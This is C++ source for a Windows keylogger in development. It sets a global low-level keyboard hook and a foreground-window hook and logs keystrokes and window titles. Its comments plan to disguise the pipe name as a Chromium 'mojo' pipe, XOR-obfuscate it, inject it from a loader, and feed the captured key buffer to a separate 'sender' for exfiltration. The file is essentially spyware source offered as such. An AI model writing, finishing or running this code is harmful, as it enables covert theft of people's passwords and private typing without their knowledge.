#include <iostream>
#include <fstream>
#include <windows.h>
#include <signal.h>
#include <vector>


std::vector<char> buf;
HWINEVENTHOOK WindowHook;
HHOOK Hook;
constexpr std::string_view PipeName = "LOCAL\mojo.30978.30336.13392945920937653385"; // xor this later, maybe inject from loader

//todo jthread to dump the buf into the pipe, add the loader / sender projects to this git repo 

void CleanUp() {
    MessageBoxA(NULL, "Test", "Test Title", 0);
    UnhookWinEvent(WindowHook);
    UnhookWindowsHookEx(Hook);
}

LONG GenericExceptionHandler(LPEXCEPTION_POINTERS p) {
    CleanUp();
    return 1;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            auto kbstruct = (KBDLLHOOKSTRUCT*)lParam;
            char key = MapVirtualKey(kbstruct->vkCode, MAPVK_VK_TO_CHAR);
            if (key == 'A') {
                int* p = NULL;
                *p = 43; // testing segfault on purpose to check exception handler, this does work, but keeping for debug
            }
            std::cout << "Hit with key" << key << "\n";
            //feed stripped version of the struct to buffer here
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND && hwnd != NULL) {
        char windowTitle[256];
        GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
        std::cout << "Active Window Changed: " << windowTitle << "\n";
    }
}


int main() {

    SetUnhandledExceptionFilter(GenericExceptionHandler);

    WindowHook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
        nullptr, WinEventProc, 0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
    );


    if (!WindowHook) {
        std::cerr << "Failed to install hook." << std::endl;
        return 1;
    }

    Hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (Hook == NULL) {
        std::cerr << "Failed to set hook" << std::endl;
        return 1;
    }


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_QUIT) {
            MessageBoxA(NULL, "Test", "Test Title", 0);
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


    return 0;
}
